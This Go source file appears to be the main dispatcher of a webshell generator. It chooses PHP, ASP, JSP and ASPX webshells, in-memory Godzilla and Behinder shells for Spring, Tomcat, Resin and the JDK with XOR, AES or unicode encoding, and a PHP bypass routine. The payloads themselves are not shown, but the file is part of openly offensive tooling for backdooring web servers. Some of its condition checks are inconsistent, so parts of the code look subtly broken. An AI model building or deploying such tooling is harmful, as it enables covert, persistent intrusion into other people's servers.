package shell

import (
	"webshell/common"
	"webshell/shell/Godzilla"
	"webshell/shell/bypass"
	"webshell/shell/memory/Behinder/BeResin"
	"webshell/shell/memory/Behinder/Bespring"
	"webshell/shell/memory/Behinder/Betomcat"
	"webshell/shell/memory/Godzilla/GoResin"
	"webshell/shell/memory/Godzilla/GoSpring"
	"webshell/shell/memory/Godzilla/Gotomcat"
	"webshell/shell/memory/Godzilla/JDK"
)

func Exec() {
	common.Flag()
	common.Parse1()
	Common()
	Bypass()
	Godzilla.Jspshell()
	Meme()
	common.File()
}

func Common() {
	if common.Password == " " {
		common.Password = common.RandStr(5)
	}
	if common.Webshell != " " {
		switch common.Webshell {
		case "php":
			Php()
		case "asp":
			Asp()
		case "jsp":
			Jsp()
		case "aspx":
			Aspx()
		case "jspx":
			Jspx()
		}
	}
}

func Meme() {
	if common.Memory == "be" && common.Encode == "xor" && common.Lei != "" {
		switch common.Lei {
		case "spring":
			Bespring.Behxor()
		case "tomcat":
			Betomcat.TomXorbL()
		case "resin":
			BeResin.BeRxor()
		}
	}
	if common.Memory == "Be" && common.Encode == "aes" && common.Lei != "" {
		switch common.Lei {
		case "spring":
			Bespring.BeS128()
		case "tomcat":
			Betomcat.TomactLis()
		case "resin":
			BeResin.BeRase128()
		}
	}
	if common.Memory == "God" && common.Encode == "aes" && common.Lei != " " {
		switch common.Lei {
		case "spring":
			GoSpring.GoSpringInterceptor()
		case "tomcat":
			Gotomcat.GoTomcatServlet()
		case "resin":
			GoResin.GoResin128()
		case "jdk":
			JDK.HttpServlet()
		}
	}
}

func Bypass() {
	if common.Bypass != " " {
		switch common.Bypass {
		case "php":
			bypass.Phpbypass()
		}
	}
	if common.Memory == "be" && common.Encode == "unicode" {
		Godzilla.Jspun()
	}
}
